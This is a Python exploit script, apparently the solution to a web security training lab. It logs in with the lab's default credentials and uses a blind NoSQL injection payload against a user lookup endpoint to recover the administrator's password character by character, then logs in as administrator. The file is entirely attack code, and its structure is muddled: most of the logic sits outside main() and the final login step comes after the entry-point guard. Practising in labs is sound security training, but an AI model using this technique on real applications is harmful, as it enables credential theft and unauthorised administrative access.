import re
import sys
import requests
import string
import urllib.parse

def main():
    if len(sys.argv) != 2:
        print("Usage: python3 script.py <url>")
        sys.exit(1)

burp_url = sys.argv[1]
login_url = burp_url + '/login'

session = requests.Session()
response = session.get(login_url)
csrf_token_match = re.search(r'<input required type="hidden" name="csrf" value="([^"]+)"', response.text)
csrf = csrf_token_match.group(1)

burp_data = {"csrf": csrf, "username": "wiener", "password": "peter"}
session.post(login_url, data=burp_data)

password = ""

for i in range(8):
        for letter in string.ascii_lowercase:
            payload = urllib.parse.quote_plus(f"' && this.password[{i}]=='{letter}' || 'a'=='b")
            r = session.get(url=f"{burp_url}/user/lookup?user=administrator{payload}")

            if r.status_code == 401:
                print("Session cookie is invalid or session expired")
                sys.exit(1)

            if r.status_code == 403:
                print("Lab link isn't correct")
                sys.exit(1)

            if "username" in r.json():
                password += letter
                print(password)

if __name__ == "__main__":
    main()


response = session.get(login_url)
csrf_token_match = re.search(r'<input required type="hidden" name="csrf" value="([^"]+)"', response.text)
csrf = csrf_token_match.group(1)
burp_data = {"csrf": csrf, "username": "administrator", "password": password}
session.post(login_url, data=burp_data)
